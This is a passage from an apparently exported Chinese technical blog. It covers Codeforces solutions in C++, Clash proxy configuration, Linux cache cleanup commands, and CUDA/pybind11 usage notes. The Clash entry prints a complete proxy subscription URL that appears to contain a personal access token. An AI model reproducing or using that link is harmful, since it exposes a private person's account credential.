class="number">1</span>][j].<span class="built_in">end</span>(); iter++) &#123;</span><br><span class="line">          <span class="keyword">if</span>(i + j == split_posi)</span><br><span class="line">            dp[<span class="number">1</span>][i][j][iter-&gt;first] += iter-&gt;second;</span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">            dp[<span class="number">1</span>][i][j][iter-&gt;first ^ v[i][j]] += iter-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(j + <span class="number">1</span> &lt; m)&#123;</span><br><span class="line">        <span class="keyword">for</span> (map&lt;ll,ll&gt;::iterator iter = dp[<span class="number">1</span>][i][j + <span class="number">1</span>].<span class="built_in">begin</span>();iter != dp[<span class="number">1</span>][i][j + <span class="number">1</span>].<span class="built_in">end</span>(); iter++) &#123;</span><br><span class="line">          <span class="keyword">if</span>(i + j == split_posi)</span><br><span class="line">            dp[<span class="number">1</span>][i][j][iter-&gt;first] += iter-&gt;second;</span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">            dp[<span class="number">1</span>][i][j][iter-&gt;first ^ v[i][j]] += iter-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ll ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">    <span class="type">int</span> j = split_posi - i;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="number">0</span> &lt;= j &amp;&amp; j &lt; m))<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">for</span>(map&lt;ll,ll&gt;::iterator iter = dp[<span class="number">1</span>][i][j].<span class="built_in">begin</span>();iter != dp[<span class="number">1</span>][i][j].<span class="built_in">end</span>();iter++)&#123;</span><br><span class="line">      ans += iter-&gt;second * dp[<span class="number">0</span>][i][j][(k ^ (iter-&gt;first))];</span><br><span class="line">      <span class="comment">//cout&lt;&lt;(k ^ iter-&gt;first)&lt;&lt;&#x27; &#x27;&lt;&lt;dp[0][i][j][(k ^ (iter-&gt;first))]&lt;&lt;endl;;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>双向搜索</tag>
      </tags>
  </entry>
  <entry>
    <title>clash配置方法</title>
    <url>/2024/03/11/clash%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>订阅地址后面加&amp;client=clash，同时订阅的命令使用<code>wget -O /home/skt1faker/VPN/clash/config.yaml "[订阅地址]&amp;client=clash"</code>，例如：
<code>wget -O /home/skt1faker/VPN/clash/config.yaml "https://getnode.dksb.store/subscribe/152449/TBfADuRZNOTJ&amp;client=clash"</code></p>
<p>注意最后修改<code>/usr/bin/renew_subcribe</code>中的订阅链接</p>
]]></content>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>cf1909E暴力题存在的特点</title>
    <url>/2024/01/21/cf1909E%E6%9A%B4%E5%8A%9B%E9%A2%98%E5%AD%98%E5%9C%A8%E7%9A%84%E7%89%B9%E7%82%B9/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>存在一组灯，编号为<code>1,2......n</code>，存在一组开关编号也为<code>1,2......n</code>，开关i能开启编号为i倍数的灯泡，问如何选择可以让灯泡打开数量不超过<span
class="math inline">\(\left \lfloor \frac{n}{5} \right
\rfloor\)</span>。需要注意的是，开关选择时会有如下要求：</p>
<ol type="1">
<li>选择至少一个开关</li>
<li>开关选择次数不能超过1</li>
<li>一些开关是有关联的，如果题目中给出关联(u,v),
那么在按下开关u时，必须按下开关v，但按下开关v不必按下开关u，比如当前有关系（1，2）（2，3），那么<code>1，2，3</code>是一个合法的选择，<code>2，3</code>也是一个合法的选择，<code>1</code>不是一个合法的选择，<code>1,2</code>也不是一个合法的选择。只要选择<code>1</code>，则必有开关<code>2,3</code>被按下。</li>
</ol>
<h1 id="题解">题解</h1>
<p>一个特殊的选择方案，<code>全部开关选择</code>将会导致编号为平方数的开关打开，所以所有开关选择后会有<span
class="math inline">\(\left\lfloor\sqrt{n}\right\rfloor\)</span>的灯泡打开，原因见下：<br />
所有开关都选择，那么x灯对应编号x的因子（因子就是所有可以整除这个数的数,不包括这个数自身.）和其本身都会导致灯的状态变化，变化次数和因子数有关，因子数量的计算可以通过数中质数因子情况确定。假设<span
class="math inline">\(x = \prod_{i =
1}^{k}z_{i}^{a_{i}}\)</span>，其中<span
class="math inline">\(z_{i}\)</span>为质数，那么因子数量为<span
class="math inline">\((\prod_{i = 1}^{k}(a_{i} + 1)) -
1\)</span>，加上x本身可知灯变化次数为<span class="math inline">\(y =
\prod_{i = 1}^{k}(a_{i} +
1)\)</span>，如果这个数为奇数，则x灯亮，为了能让y为奇数，则连乘中所有数不能为偶数，即<span
class="math inline">\(a_{i} + 1\)</span>为奇数，<span
class="math inline">\(a_{i}\)</span>为偶数，所以x中质因子幂次为偶数，导致x为完全平方数。</p>
<p>有了上面的证明，可知，当<span
class="math inline">\(\left\lfloor\sqrt{n}\right\rfloor \leq
\left\lfloor\frac{n}{5}\right\rfloor\)</span>时可以将所有开关选择，上述条件等价于<span
class="math inline">\(n \geq 20\)</span>。</p>
<p>当<span class="math inline">\(n\leq
19\)</span>时，由于确定一组灯打开数量不超过<span
class="math inline">\(\left\lfloor\frac{n}{5}\right\rfloor\)</span>没有什么特殊的构造方法（选择大于等于5的开关可能会因为关联其他开关而导致构造失效，所有已没有很好的办法），考虑到数据量较小，
使用暴力方法。</p>
<p>通过枚举开关的情况判断开关的选择是否符合要求。代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*   filename：    1909E.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  17:18  2024.01.19</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> u[maxx], v[maxx];</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; choise[maxx]; <span class="comment">// choise[元素数量][] = 符合条件的开关触发情况</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">5</span>; i &lt;= <span class="number">19</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> st = <span class="number">1</span>; st &lt; (<span class="number">1</span> &lt;&lt; (i)); st++) &#123;</span><br><span class="line">      <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">status</span><span class="params">(i, <span class="number">0</span>)</span></span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; i; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((st &gt;&gt; k) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> l = k; l &lt; i; l += (k + <span class="number">1</span>)) &#123;</span><br><span class="line">            status[l] ^= <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; i; k++) &#123;</span><br><span class="line">        sum += status[k];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (sum &gt; i / <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      choise[i].<span class="built_in">push_back</span>(st);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">5</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; <span class="number">19</span>) &#123;</span><br><span class="line">    cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">      cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; choise[n].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="comment">//cout&lt;&lt;&quot;choise&quot;&lt;&lt;choise[n][i]&lt;&lt;endl;</span></span><br><span class="line">      <span class="type">bool</span> can = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m &amp;&amp; can; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((choise[n][i] &amp; (<span class="number">1</span> &lt;&lt; (u[j]))) != <span class="number">0</span> &amp;&amp; (choise[n][i] &amp; (<span class="number">1</span> &lt;&lt; (v[j]))) == <span class="number">0</span>)</span><br><span class="line">          can = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (can) &#123;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;choise[n][i]&lt;&lt;endl;</span></span><br><span class="line">        <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((choise[n][i] &amp; (<span class="number">1</span> &lt;&lt; j)) != <span class="number">0</span>) &#123;</span><br><span class="line">            num++;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;num&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((choise[n][i] &amp; (<span class="number">1</span> &lt;&lt; j)) != <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; j + <span class="number">1</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  cin &gt;&gt; T;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;u[i], &amp;v[i]);</span><br><span class="line">      u[i]--;</span><br><span class="line">      v[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">solve</span>(n, m);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>构造</tag>
        <tag>暴力</tag>
      </tags>
  </entry>
  <entry>
    <title>clash_dashboard使用</title>
    <url>/2024/04/08/clash-dashboard%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="如何设置">如何设置</h1>
<p>到clash文件夹下查看config.yml文件，其中有一个选项为external-controller字段
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">mixed-port:</span> <span class="number">7893</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;:9990&#x27;</span></span><br><span class="line"><span class="attr">clash-for-android:</span></span><br><span class="line">    <span class="attr">append-system-dns:</span> <span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure> 这个字段表示了<code>clash_dashboard</code>运行的端口。</p>
<p>这时打开网址<code>http://clash.razord.top</code>,只要在<code>外部控制设置</code>中点击编辑，将端口设置好就行
<img src="port_setting_posi.png" /></p>
<p><img src="clash_dashboard_port.png" /></p>
<p>点击确定后就可以愉快的使用<code>clash dashboard</code>了</p>
]]></content>
      <tags>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>清理linux垃圾内容</title>
    <url>/2023/10/13/clean-cachefile/</url>
    <content><![CDATA[<h1 id="一些文件夹">一些文件夹</h1>
<ol type="1">
<li>~/.cache/vscode-cpptools/ipch ipch文件夹是Intelli
Sense（好像是预编译头文件之类的）这个东西产生的缓存文件，占用空间很大！！！每编译一次文件就会产生ipch里对应的一个文件夹。我看了我的ipch文件夹产生了121个对应的文件夹，总共产生了6G多。。。惊人啊！</li>
</ol>
<p>在VSCode找到设置→扩展→C/C++→Intelli Sense Cache
Path，如上图。1处写明了vscode默认Intelli
Sense缓存文件路径是在C盘的，2处可以更改为你要保存缓存文件的位置。据我所知，这些缓存文件删了也不影响的之前的文件的，所以可以随时删~只是每次编译又会重新产生，所以还是把缓存路径改为别的盘吧
<a
href="https://blog.csdn.net/qq_41688558/article/details/99085069">参考</a></p>
<ol start="2" type="1">
<li>~/.config/Code/Service Worker/CacheStorage
ubuntu系统下，我们的空间会越来越小，有时候不知道大文件藏在哪。其中有一项就是vscode的缓存，时间久了可能会有几十G的空间，把缓存删掉，可以腾出很大空间。
不同电脑的vscode安装目录可能有区别： cd
~/.config/Code/User/workspaceStorage/ rm ./<em> cd
~/.config/Code/Service Worker/CacheStorage$ rm ./</em></li>
</ol>
<p><a
href="https://blog.csdn.net/u011754972/article/details/120764945">参考</a></p>
<ol start="3" type="1">
<li>anaconda/pkts conda clean
命令是对所有anaconda下的包进行搜索，不用再进入其他环境重复操作 conda
clean -p
这个命令会检查哪些包没有在包缓存中被硬依赖到其他地方，并删除它们 conda
clean -t
刚刚清理的缓存的packages，现在继续清理缓存的压缩包文件，代码如下：conda
clean -t</li>
</ol>
<p>https://blog.csdn.net/zhouchen1998/article/details/124397874
https://blog.csdn.net/Robin_Pi/article/details/115004870</p>
<ol start="4" type="1">
<li>~/.local/share/Trash</li>
</ol>
<p>linux的垃圾箱</p>
<ol start="5" type="1">
<li><p>baobab可以查询大文件，然后进行删除。</p></li>
<li><p>使用snap清理时出现“Save data of snap “docker“ in automatic
snapshot set #3”这说明snap在清理时创建了快照</p></li>
</ol>
<p>如果中途你暂停了，那么可能再次删除会出现 “错误：snap "steam" has
"remove-snap" change in progress”，此时需要简单修复以下：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap changes</span><br><span class="line"><span class="built_in">sudo</span> snap abort &lt;ID number&gt;				<span class="comment">#注意这个id是上一步snap change给出的结果</span></span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br><span class="line">snap <span class="built_in">set</span> core snapshots.automatic.retention=no </span><br><span class="line"><span class="comment"># sudo snap remove steam</span></span><br></pre></td></tr></table></figure></p>
<p>这是只需要使用<code>snap remove --purge &lt;package&gt;</code>即可，</p>
<ol start="7" type="1">
<li>清理snap快照</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap saved		<span class="comment">#查看有哪些快照</span></span><br><span class="line">snap forget &lt;<span class="built_in">id</span>&gt; <span class="comment"># id为上一命令输出的滴一列值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果snap
saved中没有快照，那么可以去<code>/var/lib/snapd/snapshots</code>中查看，查到有东西可以直接删除</p>
<p><a
href="https://askubuntu.com/questions/1283423/is-it-safe-to-delete-var-lib-snapd-snapshots">参考自</a></p>
<ol start="8" type="1">
<li><p>清理snap以前本版本的安装包： 主要使用以下脚本：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash  </span></span><br><span class="line"><span class="comment">#Removes old revisions of snaps  </span></span><br><span class="line"><span class="comment">#CLOSE ALL SNAPS BEFORE RUNNING THIS  </span></span><br><span class="line"><span class="built_in">set</span> -eu  </span><br><span class="line">LANG=en_US.UTF-8 </span><br><span class="line">snap list --all | awk <span class="string">&#x27;/disabled/&#123;print $1, $3&#125;&#x27;</span> |</span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">read</span> snapname revision; <span class="keyword">do</span></span><br><span class="line">		snap remove <span class="string">&quot;<span class="variable">$snapname</span>&quot;</span> --revision=<span class="string">&quot;<span class="variable">$revision</span>&quot;</span></span><br><span class="line">	<span class="keyword">done</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>软件清理缓存：</p></li>
</ol>
<p>sudo apt install bleachbit <a
href="https://www.debugpoint.com/4-simple-steps-clean-ubuntu-system-linux/">ubuntu清理的4中方法</a>
https://www.debugpoint.com/4-simple-steps-clean-ubuntu-system-linux/
sudo apt install bleachbit</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux_manager</tag>
      </tags>
  </entry>
  <entry>
    <title>cuda并行编程</title>
    <url>/2023/12/19/cuda%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="参考资料">参考资料：</h1>
<p><a href="https://godweiyang.com/2021/01/25/cuda-reading/"></a> <a
href="https://zhuanlan.zhihu.com/p/34587739"></a></p>
<h2 id="环境配置">环境配置</h2>
<p>主要是从https://developer.nvidia.com/cuda-downloads网站上下载一个<code>.run</code>的安装包，如果之前有安装过显卡驱动的话需要现将显卡驱动卸载,
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get --purge remove nvidia*</span><br><span class="line"><span class="built_in">sudo</span> apt-get autoremove         <span class="comment"># 将一些相关的库删除，不然之后在安装cuda驱动的时候会出现显卡驱动还存在的问题。</span></span><br></pre></td></tr></table></figure></p>
<p>执行完之后就是将驱动安装<code>sudo sh cuda-xxxx-.run</code>，然后<code>accpet</code>之后按照需要安装。</p>
<p>安装结束之后记得设置环境变量，安装位置在<code>/usr/local/cuda</code>，将环境变量中添加一些，即在/etc/profile中添加如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="string">&quot;/usr/local/cuda/lib64:<span class="variable">$LD_LIBRARY_PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> C_INCLUDE_PATH=<span class="string">&quot;/usr/local/cuda/include:<span class="variable">$C_INCLUDE_PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> CPLUS_INCLUDE_PATH=<span class="string">&quot;/usr/local/cuda/include:<span class="variable">$CPLUS_INCLUDE_PATH</span>&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="host内存和device内存的分配">host内存和device内存的分配</h2>
<p>host指的是cpu，device指的是gpu，两个单位分配的内存不在一个位置，所以就有一个分配的问题，cuda提供了一个管理内存的api<br />
1.
<code>cudaError_t cudaMallocManaged(void **devPtr, size_t size, unsigned int flag=0);</code>用于分配内存<br />
2.
<code>cudaDeviceSynchronize()</code>函数保证device和host同步，这样后面才可以正确访问kernel计算的结果<br />
3. <code>cudaFree()</code>用于释放内存。 4.
<code>cudaMemcpy(result_ptr, te.data_ptr(), sizeof(float) * te.numel(),cudaMemcpyDeviceToHost);</code>
注意cudaMemcpyDeviceToHost表示device上的内存到cpu上，te.data_ptr()是在gpu上的地址，result_ptr表示在cpu上的内存地址。同样cudaMemcpyHostToDevice表示将cpu上的内存数据复制到gpu上</p>
<p>==，可以自动将host上的数据传输到device上。==</p>
<h2 id="cuda编程和torch编程">cuda编程和torch编程</h2>
<ol type="1">
<li><p>在cuda中想修改torch可以先将torch的地址搞到，将其视为一维数组，然后对这个地址进行操作，主要难点在与使用什么api
<code>tensor.data_ptr&lt;float&gt;()</code></p></li>
<li><p>cuda多线程编程中锁的问题
https://blog.csdn.net/Limiao_123/article/details/111197531</p></li>
</ol>
<h2 id="在torch-c中需要加入的头文件如下">在torch
c++中需要加入的头文件如下：</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;torch/torch.h&gt;</span><br><span class="line">#include&lt;torch/extension.h&gt;     // 这个不加不行，在使用pybind11生成链接库时，如果一些函数中参数为tensor，那么在调用时会出现TypeError: torch2numpy(): incompatible function arguments. The following argument types are supporte，这个错误</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<h2 id="python中如何调用c中的函数">python中如何调用c++中的函数</h2>
<p>https://zhuanlan.zhihu.com/p/362834539</p>
<p>在c++模块中的最后一部分一定要加上如下部分，这是是的python和c++之间产生联系的一部分代码
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PYBIND11_MODULE(example, m) &#123;</span><br><span class="line">    m.doc() = &quot;pybind11 example plugin&quot;; // optional module docstring</span><br><span class="line"></span><br><span class="line">    m.def(&quot;add&quot;, &amp;add, &quot;A function which adds two numbers&quot;);</span><br><span class="line">  </span><br><span class="line">    m.def(&quot;inadd&quot;,&amp;inadd,&quot;cin and count&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">最重要的就是这个python模块绑定</span><br><span class="line"></span><br><span class="line">example：模型名，切记不需要引号</span><br><span class="line"></span><br><span class="line">m：可以理解成模块对象把</span><br><span class="line"></span><br><span class="line">m.doc()：help说明</span><br><span class="line"></span><br><span class="line">m.def：用来注册函数和python打通界限</span><br></pre></td></tr></table></figure></p>
<h2 id="c中使用pybind11修改numpy">c++中使用pybind11修改numpy</h2>
<p>https://blog.csdn.net/howard789/article/details/125128283
https://cloud.tencent.com/developer/ask/sof/1032057</p>
<p>主要还是将numpy转换为<code>float *</code>或者<code>double *</code>，难点在于api是什么
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pybind11::array_t&lt;double&gt; narray;</span><br><span class="line">auto buf = narray.request();</span><br><span class="line">float *data = (float *)buf.ptr; // static_cast&lt;float *&gt;buf.ptr</span><br></pre></td></tr></table></figure> 上述过程用于获取numpy中存储数据的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int N = array.shape()[0], M = array.shape()[1];</span><br></pre></td></tr></table></figure>
<p>上述过程用于获取numpy中数据的维度信息。</p>
<p>numpy在c++中的一些函数： 1. pybind11::array_t<float>.size() //
元素数量有多少 2. pybind11::array_t<float>.shape() // 每个维度大小是什么
3. pybind11::array_t<float>.ndim() // 有几个维度</p>
<h2 id="c和python联动">c++和python联动</h2>
<p>https://blog.csdn.net/weixin_44966641/article/details/125377080#t23</p>
<p>主要使用一个pybind11，通过生成库进行处理。编译命令如下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -O3 -shared -std=c++11 -fPIC `python3 -m pybind11 --includes` test.cpp -o example`python3-config --extension-suffix`</span><br></pre></td></tr></table></figure>
其中<code>python3 -m pybind11 --includes</code>表示的是使用pybind11时需要include的对象，python3-config
--extension-suffix表示最终的动态链接库的后缀是什么。 下面是例子
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pybind11/pybind11.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pybind11/stl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pybind11/numpy.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> py = pybind11;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add_func</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i + j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_list</span><span class="params">(py::list my_list)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> item : my_list)</span><br><span class="line">       py::<span class="built_in">print</span>(item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">print_list2</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt; &amp; my_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> x = std::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> item : my_list)&#123;</span><br><span class="line">        x.<span class="built_in">push_back</span>(item + <span class="number">233</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">py::<span class="type">array_t</span>&lt;<span class="type">double</span>&gt; <span class="title">add_arrays</span><span class="params">(py::<span class="type">array_t</span>&lt;<span class="type">double</span>&gt; input1, py::<span class="type">array_t</span>&lt;<span class="type">double</span>&gt; input2)</span> </span>&#123;</span><br><span class="line">    py::buffer_info buf1 = input<span class="number">1.</span><span class="built_in">request</span>(), buf2 = input<span class="number">2.</span><span class="built_in">request</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf<span class="number">1.</span>ndim != <span class="number">1</span> || buf<span class="number">2.</span>ndim != <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;Number of dimensions must be one&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf<span class="number">1.</span>size != buf<span class="number">2.</span>size)</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;Input shapes must match&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* No pointer is passed, so NumPy will allocate the buffer */</span></span><br><span class="line">    <span class="keyword">auto</span> result = py::<span class="built_in">array_t</span>&lt;<span class="type">double</span>&gt;(buf<span class="number">1.</span>size);</span><br><span class="line"></span><br><span class="line">    py::buffer_info buf3 = result.<span class="built_in">request</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> *ptr1 = (<span class="type">double</span> *) buf<span class="number">1.</span>ptr,</span><br><span class="line">           *ptr2 = (<span class="type">double</span> *) buf<span class="number">2.</span>ptr,</span><br><span class="line">           *ptr3 = (<span class="type">double</span> *) buf<span class="number">3.</span>ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> idx = <span class="number">0</span>; idx &lt; buf<span class="number">1.</span>shape[<span class="number">0</span>]; idx++)</span><br><span class="line">        ptr3[idx] = ptr1[idx] + ptr2[idx];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PYBIND11_MODULE</span>(example, m) &#123;</span><br><span class="line">	m.<span class="built_in">doc</span>() = <span class="string">&quot;pybind11 example plugin&quot;</span>;  <span class="comment">//可选，说明这个模块是做什么的</span></span><br><span class="line">    m.<span class="built_in">def</span>(<span class="string">&quot;add_func&quot;</span>, &amp;add_func, <span class="string">&quot;A function which adds two numbers&quot;</span>);</span><br><span class="line">    m.<span class="built_in">attr</span>(<span class="string">&quot;the_answer&quot;</span>) = <span class="number">23333</span>;</span><br><span class="line">    py::object world = py::<span class="built_in">cast</span>(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">    m.<span class="built_in">attr</span>(<span class="string">&quot;what&quot;</span>) = world;</span><br><span 